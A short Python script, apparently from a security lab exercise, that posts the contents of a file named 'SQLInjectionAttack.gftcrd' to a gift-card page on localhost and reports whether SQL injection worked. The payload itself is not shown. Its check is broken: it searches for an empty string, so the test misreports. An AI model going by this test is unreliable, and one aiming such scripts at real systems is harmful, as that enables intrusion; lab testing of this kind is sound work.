import requests

file = open('SQLInjectionAttack.gftcrd')
inflitration = 'http://127.0.0.1:8000/use.html'
init_session = requests.Session()
body = init_session.post(inflitration, data=file)
card_key = ""
if body.text.find(card_key):
	print("SQL Injection worked!")
else:
	print("Not exploitable to SQL Injection")